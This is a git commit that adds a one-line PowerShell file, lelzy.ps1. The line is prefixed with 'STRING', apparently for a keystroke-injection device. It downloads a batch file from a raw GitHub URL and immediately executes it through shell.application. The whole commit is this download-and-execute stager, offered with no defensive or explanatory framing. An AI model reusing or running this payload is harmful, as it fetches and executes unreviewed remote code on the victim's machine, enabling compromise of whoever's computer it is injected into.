f9929434e0f8c7427e6631a604084ff0b2d912ee
deathlimited <denis_srk@live.com>
2017-11-17 03:19:26 +0200

    Add files via upload

---
+++ lelzy.ps1
@@ -0,0 +1,1 @@
+STRING $down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'; $file = 'lel.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
